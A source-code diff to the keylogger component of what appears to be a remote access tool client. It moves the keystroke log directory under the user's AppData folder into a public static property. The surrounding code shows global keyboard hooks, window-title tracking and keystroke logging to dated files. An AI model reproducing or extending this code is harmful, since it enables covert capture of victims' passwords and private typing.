@@ -14,9 +14,6 @@ namespace xClient.Core.Utilities
     /// This class provides keylogging functionality and modifies/highlights the output for
     /// better user experience.
     /// </summary>
-    /// <remarks>
-    /// The log files will be written to the log directory which is located under '%APPDATA%\Logs\'.
-    /// </remarks>
     public class Keylogger : IDisposable
     {
         /// <summary>
@@ -29,7 +26,11 @@ namespace xClient.Core.Utilities
         /// </summary>
         public bool IsDisposed { get; private set; }
 
-        private readonly string _logDirectory;
+        /// <summary>
+        /// The directory where the log files will be saved.
+        /// </summary>
+        public static string LogDirectory { get { return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Logs\\"; } }
+
         private readonly Timer _timerFlush;
         private StringBuilder _logFileBuffer;
         private List<Keys> _pressedKeys = new List<Keys>();
@@ -46,7 +47,6 @@ namespace xClient.Core.Utilities
         {
             Instance = this;
             _lastWindowTitle = string.Empty;
-            _logDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Logs\\";
             _logFileBuffer = new StringBuilder();
 
             Subscribe(Hook.GlobalEvents());
@@ -244,12 +244,12 @@ namespace xClient.Core.Utilities
         {
             bool writeHeader = false;
 
-            string fileName = _logDirectory + DateTime.Now.ToString("MM-dd-yyyy");
+            string fileName = LogDirectory + DateTime.Now.ToString("MM-dd-yyyy");
 
             try
             {
-                if (!Directory.Exists(_logDirectory))
-                    Directory.CreateDirectory(_logDirectory);
+                if (!Directory.Exists(LogDirectory))
+                    Directory.CreateDirectory(LogDirectory);
 
                 if (!File.Exists(fileName))
                     writeHeader = true;
